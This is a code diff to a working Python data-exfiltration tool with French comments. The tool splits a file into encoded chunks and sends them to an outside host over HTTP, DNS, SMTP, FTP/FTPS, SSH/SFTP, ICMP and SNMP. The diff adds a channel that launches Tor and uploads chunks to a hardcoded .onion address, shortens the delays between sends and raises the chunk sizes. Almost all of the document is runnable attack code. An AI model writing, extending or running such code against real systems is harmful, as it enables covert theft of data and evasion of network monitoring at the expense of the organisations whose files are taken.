@@ -6,10 +6,14 @@ import time
 import uuid
 import aioftp
 import socket
+import signal
 import pathlib
 import asyncio
 import smtplib
+import requests
 import asyncssh
+import platform
+import subprocess
 import http.client
 import dns.resolver
 from tqdm import tqdm
@@ -53,7 +57,7 @@ def diviser_fichier(nom_fichier, taille_partie, mode):
                 break
             if mode == "dns":
                 tmp = b32encode(partie).decode().lower()
-            elif mode == "ftp-d":
+            elif mode == "tor":
                 tmp = partie
             else:
                 tmp = urlsafe_b64encode(partie).decode()
@@ -69,7 +73,7 @@ def envoyer_paquets_smtp(destination, parties):
     to_addr = 'destinataire@localhost'
 
     for i, partie in enumerate(tqdm(parties, desc="Envoi SMTP")):
-        time.sleep(5)
+        time.sleep(0.5)
         filepath = f"chunk_{uuid.uuid4().hex[:8]}.txt"
 
         with open(filepath, "w") as fw:
@@ -112,7 +116,7 @@ def envoyer_paquets_dns(destination, parties, base_domain="exfil.domain.com"):
         except Exception as e:
             print(f"[!] Erreur DNS pour {domaine} : {e}")
 
-        time.sleep(2)
+        time.sleep(0.5)
 
 # ========================
 # EXFILTRATION HTTP
@@ -127,11 +131,11 @@ def envoyer_paquets_http(destination, parties):
     conn = http.client.HTTPConnection(ip, port, timeout=5)
 
     for i, part in enumerate(tqdm(parties, desc="Envoi HTTP")):
-        time.sleep(10)
+        time.sleep(1)
         payload = f"chunk={part}"
         conn.request("POST", path, payload, headers)
-        res = conn.getresponse()
-        res.read()
+        #res = conn.getresponse()
+        #res.read()
     conn.close()
 
 # ========================
@@ -153,6 +157,7 @@ def envoyer_paquets_ftp(destination, parties):
         return
 
     for i, part in enumerate(tqdm(parties, desc="Envoi FTP")):
+        time.sleep(1)
         filename = f"chunk_{uuid.uuid4().hex[:8]}.txt"
         with open(filename, "w") as f:
             f.write(part)
@@ -164,7 +169,6 @@ def envoyer_paquets_ftp(destination, parties):
             print(f"[!] Erreur upload FTP : {e}")
 
         os.remove(filename)
-        time.sleep(10)
 
     ftp.quit()
     print("[*] FTP terminé")
@@ -209,7 +213,7 @@ def envoyer_paquets_ftps(destination, parties):
             print(f"[!] FTPS upload error: {e}")
         finally:
             os.remove(filename)
-        time.sleep(5)
+        time.sleep(1)
 
     ftps.quit()
     print("[*] FTPS upload completed")
@@ -232,12 +236,12 @@ async def send_data(host, port, username, key_file, message):
             await process.stdin.drain()
 
 async def envoyer_paquets_ssh(destination, parties):
-    port = 22
+    port = 22222
     username = "user"
     key_file = "keys/client_key"
 
     for i, part in enumerate(tqdm(parties, desc="Envoi SSH")):
-        await asyncio.sleep(3)
+        await asyncio.sleep(0.5)
         try:
             await send_data(destination, port, username, key_file, part)
         except Exception as e:
@@ -265,7 +269,7 @@ async def send_sftp_file(host, port, username, key_file, filename, data):
     except Exception as e:
         print(f"[!] Erreur d’envoi SFTP pour {filename} : {e}")
 
-def envoyer_paquets_sftp(destination, parties):
+async def envoyer_paquets_sftp(destination, parties):
     port = 2222
     username = "user"
     key_file = "keys/client_key"
@@ -274,11 +278,9 @@ def envoyer_paquets_sftp(destination, parties):
 
     for i, part in enumerate(tqdm(parties, desc="Envoi SFTP")):
         filename = f"chunk_{uuid.uuid4().hex[:8]}.txt"
-        time.sleep(3)
+        time.sleep(0.5)
         try:
-            loop.run_until_complete(
-                send_sftp_file(destination, port, username, key_file, filename, part)
-            )
+            await send_sftp_file(destination, port, username, key_file, filename, part)
         except Exception as e:
             print(f"[!] Erreur SFTP : {e}")
 
@@ -286,7 +288,7 @@ def envoyer_paquets_sftp(destination, parties):
 # EXFILTRATION ICMP
 # ========================
 
-def envoyer_paquets_icmp(destination, parties, delai: float = 0.2):
+def envoyer_paquets_icmp(destination, parties, delai: float = 0.02):
     """
     Envoie des données via ICMP (ping) vers une destination IP.
     Chaque partie du fichier est envoyée dans un paquet ICMP.
@@ -326,12 +328,61 @@ async def envoyer_paquets_snmp(destination, parties, delai: float = 0.002):
     engine.close_dispatcher()
 
 # ========================
+# EXFILTRATION TOR (HTTP)
+# ========================
+
+ONION_ADDR = "uiarfeveadqaj3frrwlqomhgoywfdlujhw65jnzsyku7oqdlz4rwwnyd.onion"
+TORRC_PATH = "/etc/tor/torrc"
+
+def envoyer_paquets_tor(destination, parties, delai: float = 2):
+    system = platform.system()
+    
+    if system == "Linux":
+        process = subprocess.Popen(("sudo", "-u", "debian-tor", "tor", "-f", TORRC_PATH))
+        print("Waiting for Tor to bootstrap...")
+        time.sleep(10)  # pour laisser le temps à Tor de se connecter
+    
+    elif system == "Windows":
+        tor_path = pathlib.Path("../tor/tor.exe")
+        if not tor_path.exists():
+            print("Tor executable not found at ../tor/tor.exe")
+            return
+        process = subprocess.Popen((str(tor_path), "-f", "../tor/torrc"))
+        print("Waiting for Tor to bootstrap...")
+        time.sleep(10)
+    
+    destination = "useless with tor but idc i'll keep it"
+
+    proxies = {
+        "http":  "socks5h://127.0.0.1:9050",
+        "https": "socks5h://127.0.0.1:9050"
+    }
+
+    for i, part in enumerate(tqdm(parties, desc="Envoi TOR")):
+        time.sleep(delai)
+        filename = f"chunk_{uuid.uuid4().hex[:8]}.txt"
+        with open(filename, "wb") as f:
+            f.write(part)
+
+        try:
+            with open(filename, "rb") as f:
+                files = {"file": ("test.txt", f)}
+                url = f"http://{ONION_ADDR}/upload"
+                resp = requests.post(url, files=files, proxies=proxies, timeout=60)
+                print("Server response:", resp.json())
+        except requests.exceptions.RequestException as e:
+            print("Error:", e)
+        os.remove(filename)
+    process.send_signal(signal.SIGINT)
+    print("Tor stopped.")
+
+# ========================
 # MAIN
 # ========================
 
 async def main():
-    modes = ("http", "dns", "smtp", "ftp", "ssh", "icmp", "sftp", "ftps", "snmp")
-    tailles = (1000000, 5, 17250000, 20000000, 2200000, 1500, 2200000, 2000000, 185)
+    modes = ("http", "dns", "smtp", "ftp", "ssh", "icmp", "sftp", "ftps", "snmp", "tor")
+    tailles = (3000000000, 5, 17250000, 2000000000, 1500000, 1500, 2000000000, 2000000000, 185, 21000000)
 
     if len(sys.argv) < 4 or sys.argv[3] not in modes or len(sys.argv[2].split(".")) != 4:
         print(f"Utilisation : {sys.argv[0]} <Nom du fichier> <Adresse IP de destination> <Mode {modes}>")
@@ -365,11 +416,13 @@ async def main():
     elif mode == "ssh":
         await envoyer_paquets_ssh(destination, parties)
     elif mode == "sftp":
-        envoyer_paquets_sftp(destination, parties)
+        await envoyer_paquets_sftp(destination, parties)
     elif mode == "icmp":
         envoyer_paquets_icmp(destination, parties)
     elif mode == "snmp":
         await envoyer_paquets_snmp(destination, parties)
+    elif mode == "tor":
+        envoyer_paquets_tor(destination, parties)
 
 if __name__ == "__main__":
     asyncio.run(main())
